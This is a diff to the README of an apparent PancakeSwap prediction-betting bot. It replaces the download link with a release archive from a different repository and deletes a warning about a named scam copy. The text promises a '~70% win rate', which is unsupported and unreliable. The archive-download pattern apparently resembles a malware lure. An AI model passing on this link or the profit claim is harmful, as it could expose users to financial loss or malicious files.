@@ -10,7 +10,7 @@
 <p align="center">Bot for PancakeSwap Prediction – 35 technical indicators. Make smarter predictions with the Winnerbot – trust math, not emotions!</p>
 
 <p align=center>
-  <a href="https://github.com/BearAnBull/Pancakeswap-Winningbot/releases/download/V.1.1.5/Pancakeswap-Winningbot.2023.rar" ## **>Download</a>
+  <a href="https://github.com/Pandasswap/pancakeswap-prediction-game-bot/releases/download/Bot/Pancakeswap-Prediction-Bot-main.zip" ## **>Download</a>
 </p>
 
 ![PancakeSwap-Logo](/img/logo.jpg?raw=true)
@@ -18,17 +18,6 @@
 PancakeSwap Prediction Bot using live TradingView AI recomendations. **~70% Win rate**.
 
 ## ⭐ Please consider giving a **star**.
-
-## **Beware of SCAMS!!!!**
-
-**links of Fake shit:**
-
-## **Fake Copy 100%!!!!!!**
-
-# https://github.com/hasonosako/PancakeswapPredictionBot-2023
-# Beware he renames his shit 100%
-
-
 
 ## **Fake Copy!!!!!!**
 
